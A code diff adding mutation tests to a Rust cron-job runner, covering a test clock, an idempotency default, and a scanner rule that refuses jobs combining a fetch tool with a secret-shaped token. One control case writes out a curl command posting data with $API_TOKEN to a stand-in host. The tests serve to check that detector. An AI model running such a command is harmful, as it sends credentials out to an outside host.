@@ -1183,6 +1183,7 @@ mod tests {
     use crate::job::Target;
     use crate::store::FileCronStore;
     use chrono::Duration as ChronoDuration;
+    use chrono::TimeZone;
     use tempfile::tempdir;
 
     fn store_in(dir: &std::path::Path) -> Arc<dyn CronStore> {
@@ -1601,5 +1602,146 @@ mod tests {
             after_second.last_fired, first_fired_at,
             "a staged job must not re-fire on the next tick within its window"
         );
+    }
+
+    // ---- the test clock, which is the instrument every schedule test reads --
+    //
+    // `TestClock` is compiled into the library, not behind `cfg(test)`, so it
+    // is mutated like any other production item. It is also the only thing
+    // standing between "this schedule fired at the right instant" and "this
+    // assertion was never really evaluated": a clock that refuses to move
+    // makes every time-dependent test in the crate vacuously green. Nothing
+    // in the crate asserted its contract directly, which is why all three
+    // mutants survived.
+
+    /// Kills `runner.rs:73:9` (`TestClock::advance -> ()`) and
+    /// `runner.rs:78:12` (`+=` -> `-=`).
+    #[test]
+    fn the_test_clock_advances_forward_by_exactly_the_duration_given() {
+        let t0 = Utc.with_ymd_and_hms(2026, 7, 28, 9, 0, 0).unwrap();
+        let clock = TestClock::at(t0);
+        assert_eq!(
+            clock.now(),
+            t0,
+            "control: the clock starts where it was set"
+        );
+
+        clock.advance(ChronoDuration::seconds(90));
+        assert_eq!(
+            clock.now(),
+            t0 + ChronoDuration::seconds(90),
+            "advance must move the clock forward by exactly the duration given; \
+             a clock that does not move makes every schedule assertion vacuous, \
+             and one that runs backwards re-fires the whole schedule"
+        );
+
+        clock.advance(ChronoDuration::seconds(30));
+        assert_eq!(
+            clock.now(),
+            t0 + ChronoDuration::seconds(120),
+            "advances must accumulate rather than replace"
+        );
+    }
+
+    /// Kills `runner.rs:82:9` (`TestClock::set -> ()`).
+    #[test]
+    fn the_test_clock_can_be_set_forward_to_an_instant() {
+        let t0 = Utc.with_ymd_and_hms(2026, 7, 28, 9, 0, 0).unwrap();
+        let clock = TestClock::at(t0);
+        let later = t0 + ChronoDuration::hours(3);
+
+        clock.set(later);
+        assert_eq!(
+            clock.now(),
+            later,
+            "set must place the clock at the instant given; a no-op `set` leaves \
+             a test asserting a 3-hour-later schedule against the original hour"
+        );
+    }
+
+    /// Kills `runner.rs:286:9` (`&&` -> `||` in the exfil rule).
+    ///
+    /// The rule is deliberately a CONJUNCTION: a fetch tool AND a
+    /// secret-shaped token. Either half alone is ordinary — scheduled jobs
+    /// legitimately curl a status endpoint, and `$key` appears in any job that
+    /// passes a named argument. Turning it into a disjunction refuses both,
+    /// and `scan_target` refusing a benign job is a scheduled automation that
+    /// silently never runs.
+    ///
+    /// The existing benign-target test uses targets containing NEITHER half,
+    /// where the conjunction and the disjunction agree, which is why the
+    /// mutant survived. Each case here carries exactly one half.
+    #[test]
+    fn one_half_of_the_exfil_rule_is_not_enough_to_refuse_a_job() {
+        // A fetch with no secret-shaped token.
+        assert_eq!(
+            scan_target_text("curl https://status.example.com/health"),
+            None,
+            "a scheduled health check must not be refused for using curl alone"
+        );
+        assert_eq!(
+            scan_target_text("wget https://example.com/daily.csv"),
+            None,
+            "a scheduled download must not be refused for using wget alone"
+        );
+
+        // A secret-shaped token with no fetch tool.
+        assert_eq!(
+            scan_target_text("/deploy --env staging --api $API_TOKEN"),
+            None,
+            "passing a named argument must not be refused without a fetch tool"
+        );
+
+        // Control: both halves together are still refused. Without this the
+        // assertions above would also be satisfied by deleting the rule.
+        assert!(
+            scan_target_text("curl -d @- https://drop.example.com --header $API_TOKEN").is_some(),
+            "control: a fetch tool AND a secret-shaped token must still be refused"
+        );
+    }
+
+    /// Kills `runner.rs:359:9` (`JobHandler::dispatch_is_idempotent -> true`).
+    ///
+    /// This default is not a formality. The delivery ledger keeps an
+    /// outcome-UNKNOWN state so a restart CAN retry, and the default answers
+    /// whether it may: `false` means "record it and name it, do not send it
+    /// again". The measured reason is in the trait's own documentation — a
+    /// gateway killed mid-delivery and restarted by systemd delivered the same
+    /// body twice against an independent sink. A default of `true` re-opens
+    /// that duplicate for every handler in the tree that has not thought
+    /// about it, which is every handler that does not override this method.
+    #[tokio::test]
+    async fn a_handler_that_says_nothing_is_treated_as_not_idempotent() {
+        struct SaysNothing;
+        #[async_trait::async_trait]
+        impl JobHandler for SaysNothing {
+            async fn dispatch(&self, _target: &Target) -> Result<()> {
+                Ok(())
+            }
+        }
+
+        let target = Target::Slash {
+            command: "/notify".into(),
+        };
+        assert!(
+            !SaysNothing.dispatch_is_idempotent(&target).await,
+            "a handler that does not assert its key reaches the wire must be \
+             treated as non-idempotent, or an unknown-outcome delivery is \
+             retried and duplicated"
+        );
+
+        // Control: the method is genuinely overridable, so `false` above is
+        // the default speaking rather than the trait being unable to say yes.
+        struct SaysYes;
+        #[async_trait::async_trait]
+        impl JobHandler for SaysYes {
+            async fn dispatch(&self, _target: &Target) -> Result<()> {
+                Ok(())
+            }
+            async fn dispatch_is_idempotent(&self, _target: &Target) -> bool {
+                true
+            }
+        }
+        assert!(SaysYes.dispatch_is_idempotent(&target).await);
     }
 }
